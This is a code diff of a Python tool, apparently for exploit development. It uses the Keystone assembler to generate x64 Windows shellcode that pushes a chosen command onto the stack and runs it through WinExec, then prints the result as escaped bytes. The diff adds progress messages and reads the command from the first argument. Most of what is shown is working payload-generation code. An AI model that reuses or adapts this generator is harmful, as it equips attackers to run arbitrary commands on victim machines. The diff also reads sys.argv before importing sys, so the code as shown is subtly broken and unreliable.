@@ -1,23 +1,29 @@
 import ctypes, struct
 import binascii
 import os
+argument=sys.argv[1]
 import sys
 import subprocess
 from keystone import *
+
+
 def encodeCommand(command):
     # Pad commands
     command = command.ljust(8, ' ')
+    print("     making "+command+" multiple of 8...")
     # Convert ASCII characters to bytes
     result = "".join("{:02x}".format(ord(c)) for c in command)
+    print("     converting to bytes...")
     # Reverse the bytes for little endian formatting
     ba = bytearray.fromhex(result)
     ba.reverse()
     ba.hex()
-    return("0x" + ba.hex())
+    return("     0x" + ba.hex())
  
 def command(command):
     # Split command into 8 byte chunks
     size = 8
+    print("splitting into 8 byte chunks...")
     chunks = [command[i:i+size] for i in range(0, len(command), size)]
  
     output = ""
@@ -28,13 +34,10 @@ def command(command):
        output += "push rax; "
  
     for i in reversed(chunks):
-        print(i)
         output += "mov rax, " + encodeCommand(i) + "; "
         output += "push rax; "
  
     return output
-    
-    
 def main():
 
 
@@ -127,21 +130,24 @@ def main():
         sh += struct.pack("B", opcode)                          # To encode for execution
         output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
-    for argument in sys.argv[1:]:
-        CALL_FUNCTION = (
-            "" +  str(command(argument)) + ""
-            "  mov rcx, rsp;"                   # Move a pointer to calc.exe into RCX.
-            "  xor rdx,rdx;"                    # Zero RDX   
-            "  inc rdx;"                        # RDX set to 1 = uCmdShow
-            "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
-            "  call r14;"                       # Call WinExec
-        )
+    autopush=str(command(argument))
+    print("resulting asm for push:")
+    print(autopush)
+    
+    CALL_FUNCTION = (
+        "" +  autopush + ""
+        "  mov rcx, rsp;"                   # Move a pointer to calc.exe into RCX.
+        "  xor rdx,rdx;"                    # Zero RDX   
+        "  inc rdx;"                        # RDX set to 1 = uCmdShow
+        "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
+        "  call r14;"                       # Call WinExec
+    )
 
-        instructions, count = ks.asm(CALL_FUNCTION)
+    instructions, count = ks.asm(CALL_FUNCTION)
 
-        for opcode in instructions:
-            sh += struct.pack("B", opcode)                          # To encode for execution
-            output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
+    for opcode in instructions:
+        sh += struct.pack("B", opcode)                          # To encode for execution
+        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
  
     shellcode = bytearray(sh)
     print("Shellcode: "  + output )
